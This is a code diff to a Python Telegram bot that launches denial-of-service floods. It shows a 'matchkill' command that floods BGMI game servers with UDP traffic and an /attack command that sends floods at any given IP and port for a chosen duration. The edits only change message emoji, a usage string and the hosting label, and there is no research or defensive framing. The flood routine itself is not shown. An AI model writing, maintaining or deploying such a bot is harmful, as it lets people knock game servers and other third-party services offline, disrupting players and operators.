@@ -105,7 +105,7 @@ async def matchkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text('❌ Not Authorized!')
         return
     
-    await update.message.reply_text('🔥 **Matchkill initiated!** Flooding main BGMI servers...')
+    await update.message.reply_text('🔥🌊 **Matchkill initiated!** Flooding main BGMI servers...')
     log_attack(update.effective_user.id, 'BGMI_MATCH', 'UDP_FLOOD', 300)
     
     for ip, port in BGMI_SERVERS[:MAX_CONCURRENT]:
@@ -130,11 +130,11 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ip_port, duration = context.args[0], int(context.args[1])
         ip, port = ip_port.split(':')
         if attack_manager.start_attack(ip, int(port), duration):
-            await update.message.reply_text(f'⚡ Attack sent to `{ip}:{port}` for `{duration}s`')
+            await update.message.reply_text(f'⚡🗡🔫 Attack sent to `{ip}:{port}` for `{duration}s`')
         else:
             await update.message.reply_text('⏳ System busy! Max attacks reached.')
     except:
-        await update.message.reply_text('Usage: /attack <ip:port> <time>')
+        await update.message.reply_text('Usage: /attack <ip> <port> <time>')
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f'📊 **System Status**\nActive Attacks: {attack_manager.active_attacks}/{MAX_CONCURRENT}')
@@ -148,7 +148,7 @@ def main():
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("status", status))
     
-    print("✅ AWS Bot is running...")
+    print("✅ RAILWAY Bot is running...")
     application.run_polling()
 
 if __name__ == '__main__':
